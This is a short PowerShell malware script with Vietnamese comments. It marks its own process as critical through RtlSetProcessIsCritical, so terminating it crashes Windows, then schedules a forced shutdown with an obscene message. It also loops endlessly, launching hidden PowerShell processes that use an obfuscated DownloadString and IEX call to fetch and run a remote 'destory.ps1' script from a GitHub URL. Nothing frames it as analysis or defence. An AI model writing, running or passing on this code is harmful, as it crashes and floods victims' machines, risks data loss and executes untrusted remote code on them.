# Import hàm native để đánh dấu Critical
$code = @"
using System;
using System.Runtime.InteropServices;

public class CriticalProcess
{
    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern uint RtlSetProcessIsCritical(bool bNewValue, bool bNeedScb, bool bCheckFlag);
}
"@
Add-Type -AssemblyName System.Console
Add-Type -TypeDefinition $code

# Đánh dấu process là Critical
[CriticalProcess]::RtlSetProcessIsCritical($true, $false, $false)
[console]::Beep(4000, 100)   # Tần số 4000Hz, kéo dài 100ms
shutdown /s /t 60 /c "Fuck you!!!"
while ($true) {
    $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/destory.ps1")
    $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
    Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
}


